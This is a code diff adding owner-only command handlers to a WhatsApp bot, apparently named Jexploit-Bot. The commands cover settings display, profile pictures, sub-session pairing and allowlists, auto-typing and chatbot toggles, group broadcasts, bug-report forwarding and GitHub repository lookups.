+    settingsMsg += `🔸 *owner name*: ${ownername}\n`;
+    settingsMsg += `🔸 *owner number*: ${ownernumber}\n`;
+    settingsMsg += `🔸 *prefix*: ${prefix}\n`;
+    settingsMsg += `🔸 *mode*: ${mode}\n`;
+    settingsMsg += `🔸 *menu style*: ${menuStyleDb}\n`;
+    settingsMsg += `🔸 *alwaysonline*: ${getStatus(alwaysonline)}\n`;
+    settingsMsg += `🔸 *antidelete*: ${getModeStatus(antidelete)}\n`;
+    settingsMsg += `🔸 *antideletestatus*: ${getStatus(antideletestatus)}\n`;
+    settingsMsg += `🔸 *antiedit*: ${getModeStatus(antiedit)}\n`;
+    settingsMsg += `🔸 *anticall*: ${getModeStatus(anticall)}\n`;
+    settingsMsg += `🔸 *antilink*: ${getStatus(antilinkdelete)} ${antilinkdelete ? `(${antilinkaction})` : ''}\n`;
+    settingsMsg += `🔸 *antibadword*: ${getStatus(antibadword)} ${antibadword ? `(${antibadwordaction})` : ''}\n`;
+    settingsMsg += `🔸 *antitag*: ${getStatus(antitag)} ${antitag ? `(${antitagaction})` : ''}\n`;
+    settingsMsg += `🔸 *autorecording*: ${getStatus(autorecording)}\n`;
+    settingsMsg += `🔸 *autotyping*: ${getStatus(autoTyping)}\n`;
+    settingsMsg += `🔸 *autoread*: ${getStatus(autoread)}\n`;
+    settingsMsg += `🔸 *autoreact*: ${getStatus(autoreact)}\n`;
+    settingsMsg += `🔸 *chatbot text*: ${getStatus(AI_CHAT_TEXT)}\n`;
+    settingsMsg += `🔸 *chatbot voice*: ${getStatus(AI_CHAT_VOICE)}\n`;
+    settingsMsg += `🔸 *autoviewstatus*: ${getStatus(autoviewstatus)}\n`;
+    settingsMsg += `🔸 *autoreactstatus*: ${getStatus(autoreactstatus)} ${autoreactstatus ? `(${statusemoji})` : ''}\n`;
+    settingsMsg += `🔸 *welcome*: ${getStatus(welcome)}\n`;
+    settingsMsg += `🔸 *adminevent*: ${getStatus(adminevent)}\n`;
+    settingsMsg += `🔸 *antiviewonce*: ${getStatus(antiviewonce)}\n`;
+    settingsMsg += `🔸 *autosavestatus*: ${getStatus(autosavestatus)}`;
+    
+    reply(settingsMsg);
+    break;
+}
+case "getpp": {
+    if (!Access) return reply(mess.owner);
+    if (!m.quoted) {
+        // React with 📷 even if no user is quoted
+        await conn.sendMessage(m.chat, {
+            react: {
+                text: "📷",
+                key: m.key
+            }
+        });
+        return reply('Reply to a user to get their profile picture.');
+    }
+
+    // React with 📷 emoji to the command message
+    await conn.sendMessage(m.chat, {
+        react: {
+            text: "📷",
+            key: m.key
+        }
+    });
+
+    const userId = m.quoted.sender;
+
+    try {
+        const ppUrl = await conn.profilePictureUrl(userId, 'image');
+
+        await conn.sendMessage(m.chat, 
+            { 
+                image: { url: ppUrl }, 
+                caption: `📸 *Profile Picture of:* @${userId.split('@')[0]}`,
+                mentions: [ userId ]
+            }, { quoted: m }); 
+    } catch {
+        await conn.sendMessage(m.chat, { 
+            image: { url: 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60' }, 
+            caption: '⚠️ No profile picture found.' 
+        }, { quoted: m });
+    }
+}
+break
+case "update":
+case "botupdate":
+case "upgrade": {
+    if (!Access) return reply(mess.owner);
+    
+    try {
+        const updateCommand = require('./lib/update');
+        await updateCommand(conn, Access, m.chat, m);
+    } catch (err) {
+        console.error('Update error:', err);
+        reply(`*Update failed:* ${err.message}`);
+    }
+    
+}
+break
+case "pair":
+case "addsession": {
+    if (!Access) return reply(mess.owner);
+    if (!text) return reply(`*Usage:* ${prefix}pair <SESSION_ID>\n\nSESSION_ID must start with JEXPLOIT-BOT~, JEXPLOIT-BOT:~,VESPER-BOT~, VESPER-BOT:~`);
+
+    try {
+        await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
+        const { pairSubSession } = require('./lib/subSessions');
+        const result = await pairSubSession(text.trim());
+
+        if (result.ok) {
+            await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+            reply(`*Sub-session connected and saved successfully ✅*.`);
+        } else {
+            await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
+            reply(`❌ *Pairing failed*\n\n${result.reason}`);
+        }
+    } catch (err) {
+        console.error('pair command error:', err);
+        reply(`❌ *Pairing failed:* ${err.message}`);
+    }
+}
+break
+case "sessions": {
+    if (!Access) return reply(mess.owner);
+    try {
+        const { listSubSessions, getMaxSessions } = require('./lib/subSessions');
+        const sessions = listSubSessions();
+        const max = getMaxSessions();
+
+        if (sessions.length === 0) {
+            reply(`*Sub-sessions:* 0/${max}\n\nNo additional sessions connected. Pair one with ${prefix}pair <SESSION_ID>.`);
+        } else {
+            const lines = sessions.map((s, i) => {
+                const mins = Math.floor((Date.now() - s.connectedAt) / 60000);
+                return `${i + 1}. ${s.number} - connected ${mins}m ago`;
+            }).join('\n');
+            reply(`*Sub-sessions:* ${sessions.length}/${max}\n\n${lines}\n\nRemove one with ${prefix}delsession <number>.`);
+        }
+    } catch (err) {
+        console.error('sessions command error:', err);
+        reply(`❌ Error: ${err.message}`);
+    }
+}
+break
+case "delsession": {
+    if (!Access) return reply(mess.owner);
+    if (!text) return reply(`*Usage:* ${prefix}delsession <number>`);
+
+    try {
+        const { removeSubSession } = require('./lib/subSessions');
+        const result = await removeSubSession(text.trim());
+
+        if (result.ok) {
+            reply(`Sub-session has been removed.`);
+        } else {
+            reply(`❌ ${result.reason || 'Could not remove that sub-session.'}`);
+        }
+    } catch (err) {
+        console.error('delsession command error:', err);
+        reply(`❌ Error: ${err.message}`);
+    }
+}
+break
+case "allownumber": {
+    if (!Access) return reply(mess.owner);
+    if (!text) return reply(`*Usage:* ${prefix} allownumber <number>\n\nAdds a number to the sub-session allowlist so it can be paired with ${prefix}pair.`);
+
+    try {
+        const { addToAllowlist } = require('./lib/subSessions');
+        const result = await addToAllowlist(text.trim());
+
+        if (!result.ok) {
+            reply(`❌ ${result.reason}`);
+        } else if (result.alreadyPresent) {
+            reply(`ℹ️ That number is already on the allowlist.`);
+        } else {
+            reply(`✅ Added to the sub-session allowlist. You can now run:\n${prefix}pair <SESSION_ID>\n\nfor that number.`);
+        }
+    } catch (err) {
+        console.error('allow command error:', err);
+        reply(`❌ Error: ${err.message}`);
+    }
+}
+break
+case "unallownumber":
+case "disallownumber": {
+    if (!Access) return reply(mess.owner);
+    if (!text) return reply(`*Usage:* ${prefix}unallow <number>`);
+
+    try {
+        const { removeFromAllowlist } = require('./lib/subSessions');
+        const result = await removeFromAllowlist(text.trim());
+
+        if (result.ok) {
+            reply(`✅ Removed from the sub-session allowlist.`);
+        } else {
+            reply(`❌ ${result.reason}`);
+        }
+    } catch (err) {
+        console.error('unallow command error:', err);
+        reply(`❌ Error: ${err.message}`);
+    }
+}
+break
+case "allowednumbers":
+case "allowlist": {
+    if (!Access) return reply(mess.owner);
+    try {
+        const { getFullAllowlist } = require('./lib/subSessions');
+        const list = await getFullAllowlist();
+
+        if (list.length === 0) {
+            reply(`*Sub-session allowlist:* empty\n\nAdd a number with ${prefix}allow <number>.`);
+        } else {
+            const lines = list.map((n, i) => `${i + 1}. ${n}`).join('\n');
+            reply(`*Sub-session allowlist* (${list.length}):\n\n${lines}`);
+        }
+    } catch (err) {
+        console.error('allowed command error:', err);
+        reply(`❌ Error: ${err.message}`);
+    }
+}
+break
+case "toviewonce": {
+if (!Access) return reply(mess.owner);
+    if (!quoted) return reply(`*Reply to an Image or Video*`);
+
+    if (/image/.test(mime)) {
+      const anuan = await conn.downloadAndSaveMediaMessage(quoted);
+      conn.sendMessage(
+        m.chat,
+        {
+          image: { url: anuan },
+          caption: mess.done,
+          fileLength: "999",
+          viewOnce: true
+        },
+        { quoted: m }
+      );
+    } else if (/video/.test(mime)) {
+      const anuanuan = await conn.downloadAndSaveMediaMessage(quoted);
+      conn.sendMessage(
+        m.chat,
+        {
+          video: { url: anuanuan },
+          caption: mess.done,
+          fileLength: "99999999",
+          viewOnce: true
+        },
+        { quoted: m }
+      );
+    } else if (/audio/.test(mime)) {
+      const bebasap = await conn.downloadAndSaveMediaMessage(quoted);
+      conn.sendMessage(m.chat, {
+        audio: { url: bebasap },
+        mimetype: "audio/mpeg",
+        ptt: true,
+        viewOnce: true
+      });
+   }
+}
+break
+case "private": {
+if (!Access) return reply(mess.owner) 
+conn.public = false
+await db.set(botNumber, 'mode', 'private');
+reply(`*${global.botname} successfully changed to private mode*.`)
+}
+break
+case "join": {
+if (!Access) return reply(mess.owner);
+    if (!text) return reply("Enter group link");
+    if (!isUrl(args[0]) && !args[0].includes("whatsapp.com")) return reply("Invalid link");
+
+    try {
+      const link = args[0].split("https://chat.whatsapp.com/")[1];
+      await conn.groupAcceptInvite(link);
+      reply("Joined successfully");
+    } catch {
+      reply("Failed to join group");
+    }
+}
+break
+case "broadcast": {
+if (!Access) return reply(mess.owner);
+    if (args.length === 0) return reply("📢 Please provide a message to broadcast.");
+    const message = args.join(' ');
+    const groups = Object.keys(await conn.groupFetchAllParticipating());
+    for (const groupId of groups) {
+        await conn.sendMessage(groupId, { text: message }, { quoted: mek });
+    }
+    reply("📢 Message broadcasted to all groups.");
+}
+break
+case "groupjids": {
+    if (!Access) return reply(mess.owner);
+    const groups = await conn.groupFetchAllParticipating();
+    const groupJids = Object.keys(groups).join('\n');
+    reply(`📝 *Group JIDs:*\n\n${groupJids}`);
+}
+break
+case "request": {
+if (!Access) return reply(mess.owner);
+    if (!text) return reply(`Example: ${prefix + command} I would like a new feature (specify) to be added.`);
+
+    const requestMsg = `
+*REQUEST*
+
+*User*: @${m.sender.split("@")[0]}
+*Request*: ${text}
+
+    `;
+
+    const confirmationMsg = `
+Hi ${m.pushName},
+
+Your request has been forwarded to my developer.
+Please wait for a reply.
+
+*Details:*
+${requestMsg}
+    `;
+
+    conn.sendMessage("256742932677@s.whatsapp.net", { text: requestMsg, mentions: [m.sender] }, { quoted: m });
+    conn.sendMessage(m.chat, { text: confirmationMsg, mentions: [m.sender] }, { quoted: m });
+}
+break
+case "reportbug": {
+if (!Access) return reply(mess.owner);
+    if (!text) return reply(`Example: ${prefix + command} Hey, play command isn't working`);
+
+    const bugReportMsg = `
+*BUG REPORT*
+
+*User*: @${m.sender.split("@")[0]}
+*Issue*: ${text}
+
+    `;
+
+    const confirmationMsg = `
+Hi ${m.pushName},
+
+Your bug report has been forwarded to my developer.
+Please wait for a reply.
+
+*Details:*
+${bugReportMsg}
+    `;
+
+    conn.sendMessage("256742932677@s.whatsapp.net", { text: bugReportMsg, mentions: [m.sender] }, { quoted: m });
+    conn.sendMessage(m.chat, { text: confirmationMsg, mentions: [m.sender] }, { quoted: m });
+}
+break
+case "groupid": {
+    if (!Access) return reply(mess.owner);
+    if (!q) return reply('*Please provide a group link*!');
+    
+    let linkRegex = args.join(" ");
+    let coded = linkRegex.split("https://chat.whatsapp.com/")[1];
+    if (!coded) return reply("Link Invalid");
+
+    conn.query({
+      tag: "iq",
+      attrs: {
+        type: "get",
+        xmlns: "w:g2",
+        to: "@g.us"
+      },
+      content: [{ tag: "invite", attrs: { code: coded } }]
+    }).then(async (res) => {
+      const tee = `${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}`;
+      reply(tee + '@g.us');
+    });
+}
+break
+case 'autotyping':
+case 'typing': {
+    if (!Access) return reply(mess.owner);
+    const autoTyping = await db.get(botNumber, 'autoTyping', false);
+    
+    if (!Access) return reply(mess.owner);
+    
+    const mode = args[0]?.toLowerCase();
+    if (!mode || !['on', 'off'].includes(mode)) {
+        return reply(`❌ Usage: ${prefix}autotyping <on/off>`);
+    }
+    
+    const boolValue = mode === 'on';
+    
+    // Save to database (batched, efficient!)
+    await db.set(botNumber, 'autoTyping', boolValue);
+    
+    reply(`✅ Auto-typing ${boolValue ? 'enabled' : 'disabled'}`);
+    break;
+}
+case 'autoreact': {
+    if (!Access) return reply(mess.owner);
+    
+    const mode = args[0]?.toLowerCase();
+    if (!mode || !['on', 'off'].includes(mode)) {
+        const current = await db.get(botNumber, 'autoreact', false);
+        return reply(`❌ Usage: ${prefix}autoreact <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
+    }
+    
+    const boolValue = mode === 'on';
+    await db.set(botNumber, 'autoreact', boolValue);
+    reply(`✅ Auto-react ${boolValue ? 'enabled' : 'disabled'}`);
+    break;
+}
+case 'autoread': {
+    if (!Access) return reply(mess.owner);
+    
+    const mode = args[0]?.toLowerCase();
+    if (!mode || !['on', 'off'].includes(mode)) {
+        const current = await db.get(botNumber, 'autoread', false);
+        return reply(`❌ Usage: ${prefix}autoread <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
+    }
+    
+    const boolValue = mode === 'on';
+    await db.set(botNumber, 'autoread', boolValue);
+    reply(`✅ Auto-read ${boolValue ? 'enabled' : 'disabled'}`);
+    break;
+}
+case 'autorecord':
+case 'autorecording': {
+    if (!Access) return reply(mess.owner);
+    
+    const mode = args[0]?.toLowerCase();
+    if (!mode || !['on', 'off'].includes(mode)) {
+        const current = await db.get(botNumber, 'autorecording', false);
+        return reply(`❌ Usage: ${prefix}autorecord <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
+    }
+    
+    const boolValue = mode === 'on';
+    await db.set(botNumber, 'autorecording', boolValue);
+    reply(`✅ Auto-recording ${boolValue ? 'enabled' : 'disabled'}`);
+    break;
+}
+case 'antigroupmention':
+case 'antigpmention':
+case 'agm': {
+    if (!Access) return reply(mess.owner);
+    if (!m.isAdmin) return reply(global.mess.notadmin);
+    if (!m.isBotAdmin) return reply(global.mess.botadmin);
+    
+    const mode = args[0]?.toLowerCase();
+    
+    if (!mode || !['on', 'off'].includes(mode)) {
+        const current = await db.get(botNumber, 'antigroupmention', false);
+        return reply(`❌ *ANTI GROUP MENTION*\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}\n\n📌 *Usage:*\n${prefix}antigroupmention on\n${prefix}antigroupmention off`);
+    }
+    
+    const boolValue = mode === 'on';
+    await db.set(botNumber, 'antigroupmention', boolValue);
+    
+    reply(`✅ Anti Group Mention ${boolValue ? 'enabled' : 'disabled'}`);
+    break;
+}
+case 'aichat':
+case 'chatbot':
+case 'aichatbot':
+case 'setai': {
+    if (!Access) return reply(mess.owner);
+    
+    const mode = args[0]?.toLowerCase();
+    const action = args[1]?.toLowerCase();
+    
+    // Show help menu
+    if (!mode || !['on', 'off', 'status', 'text', 'voice', 'both'].includes(mode)) {
+        const textStatus = await db.get(botNumber, 'AI_CHAT_TEXT', false);
+        const voiceStatus = await db.get(botNumber, 'AI_CHAT_VOICE', false);
+        
+        return reply(`*🤖 AI CHATBOT SETTINGS*\n\n` +
+            `📝 *Text Mode:* ${textStatus ? 'ON ✅' : 'OFF ❌'}\n` +
+            `🎙️ *Voice Mode (PTT):* ${voiceStatus ? 'ON ✅' : 'OFF ❌'}\n\n` +
+            `*Commands:*\n` +
+            `• ${prefix}chatbot text on - Enable text responses\n` +
+            `• ${prefix}chatbot text off - Disable text responses\n` +
+            `• ${prefix}chatbot voice on - Enable voice responses\n` +
+            `• ${prefix}chatbot voice off - Disable voice responses\n` +
+            `• ${prefix}chatbot both on - Enable both text & voice\n` +
+            `• ${prefix}chatbot both off - Disable both\n` +
+            `• ${prefix}chatbot status - Show current settings`);
+    }
+    
+    // Handle status
+    if (mode === 'status') {
+        const textStatus = await db.get(botNumber, 'AI_CHAT_TEXT', false);
+        const voiceStatus = await db.get(botNumber, 'AI_CHAT_VOICE', false);
+        return reply(`*🤖 AI CHATBOT STATUS*\n\n` +
+            `📝 *Text Mode:* ${textStatus ? 'ON ✅' : 'OFF ❌'}\n` +
+            `🎙️ *Voice Mode (PTT):* ${voiceStatus ? 'ON ✅' : 'OFF ❌'}\n\n` +
+            `📌 Use ${prefix}chatbot help for more commands`);
+    }
+    
+    // Handle both mode
+    if (mode === 'both') {
+        if (!action || !['on', 'off'].includes(action)) {
+            return reply(`❌ Usage: ${prefix}chatbot both <on/off>\nExample: ${prefix}chatbot both on`);
+        }
+        
+        const boolValue = action === 'on';
+        await db.set(botNumber, 'AI_CHAT_TEXT', boolValue);
+        await db.set(botNumber, 'AI_CHAT_VOICE', boolValue);
+        
+        if (boolValue) {
+            reply(`✅ AI Chatbot enabled (Text + Voice)\n\nBot will respond with both text and voice messages!`);
+        } else {
+            reply(`✅ AI Chatbot disabled completely`);
+        }
+        break;
+    }
+    
+    // Handle text mode
+    if (mode === 'text') {
+        if (!action || !['on', 'off'].includes(action)) {
+            return reply(`❌ Usage: ${prefix}chatbot text <on/off>\nExample: ${prefix}chatbot text on`);
+        }
+        
+        const boolValue = action === 'on';
+        await db.set(botNumber, 'AI_CHAT_TEXT', boolValue);
+        reply(`✅ Text responses ${boolValue ? 'enabled' : 'disabled'}`);
+        break;
+    }
+    
+    // Handle voice mode
+    if (mode === 'voice') {
+        if (!action || !['on', 'off'].includes(action)) {
+            return reply(`❌ Usage: ${prefix}chatbot voice <on/off>\nExample: ${prefix}chatbot voice on`);
+        }
+        
+        const boolValue = action === 'on';
+        await db.set(botNumber, 'AI_CHAT_VOICE', boolValue);
+        reply(`✅ Voice responses (PTT) ${boolValue ? 'enabled' : 'disabled'}`);
+        break;
+    }
+    
+    // Handle on/off (legacy - turns on both)
+    if (mode === 'on') {
+        await db.set(botNumber, 'AI_CHAT_TEXT', true);
+        await db.set(botNumber, 'AI_CHAT_VOICE', true);
+        reply(`✅ AI Chatbot enabled (Text + Voice)`);
+        break;
+    }
+    
+    if (mode === 'off') {
+        await db.set(botNumber, 'AI_CHAT_TEXT', false);
+        await db.set(botNumber, 'AI_CHAT_VOICE', false);
+        reply(`✅ AI Chatbot disabled`);
+        break;
+    }
+    
+    reply(`❌ Invalid command!\n\n📌 Try:\n• ${prefix}chatbot text on\n• ${prefix}chatbot voice on\n• ${prefix}chatbot both on`);
+    
+}
+break
+case 'deletepp':
+case 'delpp': {
+if (!Access) return reply(mess.owner);
+conn.removeProfilePicture(conn.user.id)
+("*Successfully deleted profile pic*")
+}
+break 
+case "unblockall": {
+    if (!Access) return reply(mess.owner);
+
+    try {
+      const blockedList = await conn.fetchBlocklist();
+      if (!blockedList.length) return reply("✅ No blocked contacts to unblock.");
+
+      for (const user of blockedList) {
+        await conn.updateBlockStatus(user, "unblock");
+      }
+
+      reply(`✅ Successfully unblocked *${blockedList.length}* contacts.`);
+    } catch (error) {
+      reply("⚠️ Failed to unblock all contacts.");
+    }
+}
+break
+break
+case "leave":
+case "leavegc": {
+if (!m.isGroup) return reply(mess.group);
+if (!Access) return reply(mess.owner);
+    reply("*Goodbye, it was nice being here!*");
+    await sleep(3000);
+    await conn.groupLeave(m.chat);
+}
+break
+case "setbio": {
+if (!Access) return reply(mess.owner);
+if (!text) return reply(`*Text needed*\nExample: ${prefix + command} ${global.botname}`);
+
+    await conn.updateProfileStatus(text);
+    reply(`*Successfully updated bio to "${text}"*`);
+}
+break
+case "p":
+case "ping": {
+const startTime = performance.now();
+
+    try {
+      const sentMessage = await conn.sendMessage(m.chat, {
+        text: "🔸Pong!",
+        contextInfo: { quotedMessage: m.message }
+      });
+      
+      const endTime = performance.now();
+      const latency = `${(endTime - startTime).toFixed(2)} ms`;
+      
+      await conn.sendMessage(m.chat, {
+        text: `*🏓 ${global.botname} Speed:* ${latency}`,
+        edit: sentMessage.key, 
+        contextInfo: { quotedMessage: m.message }
+      });
+
+    } catch (error) {
+      console.error('Error sending ping message:', error);
+      await conn.sendMessage(m.chat, {
+        text: 'An error occurred while trying to ping.',
+        contextInfo: { quotedMessage: m.message }
+      });
+   }
+}
+break
+case "up":
+case "uptime": {
+    const startTime = performance.now();
+
+    try {
+        const sentMessage = await conn.sendMessage(m.chat, {
+            text: "⚡ Testing connection...",
+            contextInfo: { quotedMessage: m.message }
+        });
+        
+        const endTime = performance.now();
+        const ping = `${(endTime - startTime).toFixed(2)}`;
+        
+        // Get SERVER uptime
+        const serverUptime = getServerUptime();
+        
+        const botInfo = `🔸 *Uptime* : *${serverUptime}*`;
+        
+        await conn.sendMessage(m.chat, {
+            text: botInfo,
+            edit: sentMessage.key,
+            contextInfo: { quotedMessage: m.message }
+        });
+
+    } catch (error) {
+        console.error('❌ Uptime error:', error);
+        await conn.sendMessage(m.chat, {
+            text: `❌ Error: ${error.message}`,
+            contextInfo: { quotedMessage: m.message }
+        });
+    }
+}
+break
+case "script":
+case "sc": {
+   try {
+            const repoOwner = "Kevintech-hub";
+            const repoName = "Jexploit-Bot";
+            const apiUrl = `https://api.github.com/repos/${repoOwner}/${repoName}`;
+            
+            const { data } = await axios.get(apiUrl, {
+                timeout: 5000,
+                headers: { 'User-Agent': 'Vesper-Xmd Bot' }
+            });
+
+            const repoInfo = `
+╭──❖ 「 *Jexploit Repository*」 ❖──
+│
+🔸 *Repository*  : ${data.name || repoName}
+🔸 *Owner*       : ${repoOwner}
+🔸 *Description* : ${data.description || 'No description'}
+│
+🔹 *Stars*       :  ${data.stargazers_count || 0}
+🔹 *Forks*       :  ${data.forks_count || 0}
+🔹 *Issues*      :  ${data.open_issues_count || 0}
+🔹 *Watchers*    : 👀 ${data.watchers_count || 0}
+│
+🔸 *Language*    : ${data.language || 'N/A'}
+🔸 *License*     : ${data.license?.name || 'None'}
+🔸 *Created*     : ${new Date(data.created_at).toLocaleDateString()}
+🔸 *Updated*     :  ${new Date(data.updated_at).toLocaleDateString()}
+│
+🔹 *GitHub Link* :
+🔹 https://github.com/${repoOwner}/${repoName}
+│
+╰─────────────────❖
+
+✨ @${m.sender.split("@")[0]} *Don't forget to ⭐ star the repo!* ✨`;
+
+            const thumbnailUrl = 'https://i.ibb.co/rR9TKcBH/f05860da845e.jpg';
+            
+            await conn.sendMessage(m.chat, {
+                text: repoInfo,
+                contextInfo: {
+                    mentionedJid: [m.sender],
+                    externalAdReply: {
+                        title: "🌟 JEXPLOIT REPOSITORY",
+                        body: `⭐ ${data.stargazers_count || 0} Stars | 🍴 ${data.forks_count || 0} Forks`,
+                        thumbnailUrl: thumbnailUrl,  
+                        sourceUrl: `https://github.com/${repoOwner}/${repoName}`,
+                        mediaType: 1,
+                        renderLargerThumbnail: true
+                    }
+                }
+            }, { quoted: m });
+
+        } catch (error) {
+            console.error('Repo error:', error);
+            const fallbackInfo = `
+╭──❖ 「 REPOSITORY 」 ❖──
+│
+🔸 *Repository* : Jexploit-Bot
+🔸 *Owner*      : Kevintech-hub
+🔸 *GitHub*     : https://github.com/Kevintech-hub/Jexploit-Bot
+│
+╰─────────────────❖
+
+✨ @${m.sender.split("@")[0]} *Visit the repo to ⭐ star!* ✨`;
+
+            await conn.sendMessage(m.chat, { 
+                text: fallbackInfo,
+                contextInfo: { 
+                    mentionedJid: [m.sender],
+                    externalAdReply: {
+                        title: `${global.botname}`,
+                        body: "GitHub Repository",
+                        thumbnailUrl: 'https://i.ibb.co/rR9TKcBH/f05860da845e.jpg',
+                        sourceUrl: "https://github.com/Kevintech-hub/Vesper-Xmd"
+                    }
+                }
+            }, { quoted: m });
+        }
+}
+break
+case 'github':
+case 'repo': {
+    try {
+        const githubCommand = require('./KelvinCmds/github');
+
+        await githubCommand(conn, m.chat, m, buttonHandler);
+    } catch (error) {
+        console.error('Error in github command:', error);
+        reply('❌ Error fetching repository information.');
+    }
+    
+}
+break
+case "githubsearch": {
+    if (!text) {
+        return reply(`*🔍 GITHUB SEARCH*\n\nUsage: ${prefix}githubsearch <query>\nExample: ${prefix}githubsearch Kevintech-hub`);
+    }
+
+    await reply(`🔍 Searching GitHub for: ${text}...`);
+    await conn.sendMessage(m.chat, { react: { text: "🔍", key: m.key } });
+
+    try {
+        const apiUrl = `https://api.nexray.eu.cc/search/github?q=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl, { timeout: 15000 });
+        const data = response.data;
+
+        if (!data.status || !data.result || data.result.length === 0) {
+            return reply(`❌ No results found for: "${text}"`);
+        }
+
+        const results = data.result.slice(0, 10);
+        let message = `🔍 *GITHUB SEARCH RESULTS*\n📌 Query: ${text}\n📊 Found: ${data.result.length} results\n\n`;
+
+        for (let i = 0; i < results.length; i++) {
+            const item = results[i];
+            const repo = item.repository;
+            const file = item.file;
+            const author = item.author;
+            
+            message += `*${i + 1}. ${file.name}*\n`;
+            message += `📦 Repo: ${repo.full_name}\n`;
+            message += `📝 Desc: ${repo.description || 'No description'}\n`;
+            message += `⭐ Stars: ${repo.stars} | 🍴 Forks: ${repo.forks}\n`;
+            message += `💻 Language: ${repo.language || 'N/A'}\n`;
+            message += `👤 Author: ${author.name}\n`;
+            message += `🔗 URL: ${repo.url}\n`;
+            message += `📄 Raw: ${file.raw_url}\n\n`;
+        }
+
+        if (data.result.length > 10) {
+            message += `_...and ${data.result.length - 10} more results_\n`;
+        }
+
+        await conn.sendMessage(m.chat, { text: message }, { quoted: m });
+        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
+
+    } catch (error) {
+        console.error('GitHub search error:', error);
+        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
+        reply(`❌ Failed to search GitHub: ${error.message}`);
+    }
+    
+}
+break
+case 'searchrepo':
+case 'findrepo':
+case 'reposearch': {
+    if (!text) {
+        return reply(`*🔍 GITHUB REPO SEARCH*\n\n*Usage:* ${prefix}${command} <owner>/<repo>\n*Example:* ${prefix}${command} Kevintech-hub/Jexploit-Bot`);
+    }
+
+    // Parse owner/repo from user input
+    let owner, repo;
+
+    if (text.includes('/')) {
+        const parts = text.split('/').map(s => s.trim()).filter(Boolean);
+        owner = parts[0];
+        repo = parts[1];
+    } else if (text.includes('github.com')) {
+        // Handle full URL: https://github.com/owner/repo
+        const match = text.match(/github\.com\/([^\/\s]+)\/([^\/\s]+)/i);
+        if (match) {
+            owner = match[1];
+            repo = match[2].replace(/\.git$/, '');
+        }
+    }
+
+    if (!owner || !repo) {
+        return reply(`❌ *Invalid format!*\n\nPlease provide the repo as *owner/repo*.\n*Example:* ${prefix}${command} Kevintech-hub/Jexploit-Bot`);
+    }
+
+    await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
+
+    try {
+        const apiUrl = `${global.wow}info/github-repo?owner=${encodeURIComponent(owner)}&repo=${encodeURIComponent(repo)}&apikey=${global.KevinApi}`;
+
+        const response = await axios.get(apiUrl, { timeout: 15000 });
+        const data = response.data;
+
+        if (!data?.status || !data?.data) {
+            await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
+            return reply(`❌ *Repo not found:* ${owner}/${repo}\n\nDouble-check the spelling or make sure the repo is public.`);
+        }
+
+        const r = data.data;
+
+        const formatNumber = (n) => {
+            if (n === undefined || n === null) return '0';
+            if (n >= 1000000) return (n / 1000000).toFixed(1) + 'M';
+            if (n >= 1000) return (n / 1000).toFixed(1) + 'K';
+            return String(n);
+        };
+
+        const formatDate = (iso) => {
+            try {
+                return new Date(iso).toLocaleDateString('en-US', {
+                    year: 'numeric', month: 'short', day: 'numeric'
+                });
+            } catch (_) {
+                return 'N/A';
+            }
+        };
+
+        const repoCard =
+`╭──❖ 「 *GITHUB REPO* 」 ❖──
+│
+│ 📦 *Name:* ${r.full_name || `${owner}/${repo}`}
+│ 📝 *Description:* ${r.description || '_No description_'}
+│ 🔤 *Language:* ${r.language || 'N/A'}
+│ 🔒 *Visibility:* ${r.private ? 'Private' : 'Public'}${r.fork ? ' (Fork)' : ''}
+│
+│ ⭐ *Stars:* ${formatNumber(r.stars)}
+│ 👁️ *Watchers:* ${formatNumber(r.watchers)}
+│ 🍴 *Forks:* ${formatNumber(r.forks)}
+│ 🐛 *Open Issues:* ${formatNumber(r.open_issues)}
+│ 📦 *Size:* ${r.size_kb ? formatNumber(r.size_kb) + ' KB' : 'N/A'}
+│
+│ 🌿 *Default Branch:* ${r.default_branch || 'main'}
+│ 📜 *License:* ${r.license || 'None'}
+│ 📅 *Created:* ${formatDate(r.created_at)}
+│ 🔄 *Updated:* ${formatDate(r.updated_at)}
+│ 🚀 *Last Push:* ${formatDate(r.pushed_at)}
+│
+│ 👤 *Owner:* ${r.owner?.login || owner}
+│ 🔗 *Repo:* ${r.html_url || `https://github.com/${owner}/${repo}`}
+│
+╰─────────────────❖
+
+✨ @${m.sender.split('@')[0]} *Use the link above to check it out!* ✨`;
+
+        // Pick a thumbnail: owner's avatar looks nice
+        const thumbnailUrl = r.owner?.avatar_url || 'https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png';
+
+        await conn.sendMessage(m.chat, {
+            text: repoCard,
+            contextInfo: {
+                mentionedJid: [m.sender],
+                externalAdReply: {
+                    title: `🔍 ${r.full_name || `${owner}/${repo}`}`,
+                    body: `⭐ ${formatNumber(r.stars)}  •  🍴 ${formatNumber(r.forks)}  •  👁️ ${formatNumber(r.watchers)}`,
+                    thumbnailUrl: thumbnailUrl,
+                    sourceUrl: r.html_url || `https://github.com/${owner}/${repo}`,
+                    mediaType: 1,
+                    renderLargerThumbnail: true
+                }
+            }
+        }, { quoted: m });
+
+        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+
+    } catch (error) {
+        console.error('[SEARCHREPO] Error:', error.message);
+        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
+        reply(`❌ *Failed to fetch repo info.*\n\n${error.message}`);
+    }
+}
+break
+case "alive": {
+    const serverUptime = getServerUptime();
+    
+    const imageUrls = [
+        "./start/lib/Media/Jexploit1.jpg",
+        "./start/lib/Media/Jexploit2.jpg"   
+    ];
+    
+    const audioUrls = [
+        'https://files.catbox.moe/4zztul.mp3',
+        'https://files.catbox.moe/4870wa.m4a',
+        'https://files.catbox.moe/m1u0zl.opus',
